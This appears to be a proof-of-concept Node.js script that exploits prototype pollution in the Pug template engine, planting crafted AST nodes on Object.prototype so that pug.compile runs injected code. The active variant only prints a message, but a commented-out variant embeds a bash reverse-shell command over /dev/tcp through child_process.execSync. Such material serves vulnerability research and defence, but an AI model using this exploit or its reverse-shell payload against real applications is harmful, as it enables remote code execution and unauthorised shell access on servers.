console.log("===========start===========")
pug = require("pug")

/* Payload Injection*/
// inject property to root prototype

// exp-1
// Object.prototype.block = {
//     type: "Text",
//     line: "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/127.0.0.1/8080 0>&1'`)"
// }

// exp-2
// Object.prototype['attrs'] = []; // helper porperty to make the control flow happen
// Object.prototype['attributeBlocks'] = []; // helper porperty to make the control flow happen
// Object.prototype['block'] = { 
//   type: "Block",
//   nodes: [{
//       type: "Tag",
//       name: "p",
//       block: {
//         type: "Block",
//         nodes: [{
//             type: "Code",
//             val: "console.log('code injection!!!')",
//             block: { // this block is used to stop the infinite loop after we polluted the block property
//               type: "Block",
//               nodes: [{
//                   type: "Comment",
//                   val: "End the visiting node process"
//                 }]
//           }}
//       ]}
//     }
// ]}

// Object.prototype['attrs'] = []; // helper porperty to make the control flow happen
// Object.prototype['attributeBlocks'] = []; // helper porperty to make the control flow happen
// Object.prototype['block'] = { 
//     type: "Block",
//     nodes: [{
//         type: "Code",
//         val: "console.log('code injection!!!')",
//         block: { // this block is used to stop the infinite loop after we polluted the block property
//           type: "Block",
//           nodes: [{
//               type: "Comment",
//               val: "End the visiting node process"
//             }]
//       }}
//   ]}

Object.prototype['block'] = { 
    type: "Code",
    val: "console.log('code injection!!!')",
    block: { // this block is used to stop the infinite loop after we polluted the block property
        type: "Comment",
        val: "End the visiting node process"
  }
}

// for node-find-undefined


const template = pug.compile(`h1= msg`);
console.log(template({msg: "Hello World"}));

// for node-find-undefined
console.log("===========end===========")

// console.log(template.toString());